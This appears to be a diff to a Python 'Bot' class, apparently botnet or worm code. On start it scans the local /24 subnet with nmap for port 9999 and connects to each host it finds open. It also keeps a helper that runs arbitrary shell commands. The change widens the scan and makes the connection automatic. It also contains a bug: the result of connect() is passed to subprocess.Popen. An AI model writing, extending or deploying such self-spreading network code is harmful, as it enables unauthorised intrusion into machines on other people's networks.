@@ -15,19 +15,17 @@ class Bot:
     
     SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     port = '9999'
-    connected_hosts = []
-
+    
     def __init__(self):
         self.key = Random.new().read(self.BLOCK_SIZE)
         self.scan_network()
 
+
     def connect(self, serv, portNum):
         try:
             self.SERVER.connect((serv, portNum))
-            self.connected_hosts.append(serv)
         except:
             print("[-] Could Not Connect")    
-        
 
 
     def send_message(self, message):
@@ -79,6 +77,7 @@ class Bot:
         ps =  subprocess.Popen(cmd, stdout=subprocess.PIPE, \
             stderr=subprocess.STDOUT, shell=True)
         return ps.communicate()[0]
+
     
     def get_local_ip(self):
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -86,24 +85,22 @@ class Bot:
         ip = s.getsockname()[0]
         s.close()
         return ip
-    
-    def callback_result(self, host, scan_result):
-        try:
-            if scan_result['scan'][unicode(host)]['tcp'][int(self.port)]['state'] == 'open':
-                print("%s \tOPEN" % host)
-                #self.connect(host, self.port)
-            else:
-                print("%s \tClosed" % host)
-        except:
-            print("%s \tClosed" % host)
+
     
     def scan_network(self):
-        nm = nmap.PortScannerAsync()
-        ip_range = self.get_local_ip()[:-2] + '.1-20'
+        nm = nmap.PortScanner()
+        ip_range = self.get_local_ip()[:-2] + '.0/24'
         
-        nm.scan(hosts=ip_range, arguments='-n -PN -PA'+self.port, callback=self.callback_result)
-        while nm.still_scanning():
-            nm.wait(2)
-                
+        nm.scan(hosts=ip_range, arguments='-n -PN -PA'+self.port)
+        for host in nm.all_hosts():
+            try:
+                if nm[host]['tcp'][int(self.port)]['state'] == 'open':
+                    print("%s \tOPEN" % host)
+                    subprocess.Popen(self.connect(host, self.port), stdout=subprocess.PIPE, \
+                        stderr=subprocess.STDOUT, shell=True)
+                else:
+                    print("%s \tClosed" % host)
+            except:
+                print("%s \tClosed" % host)
 
 bot = Bot()
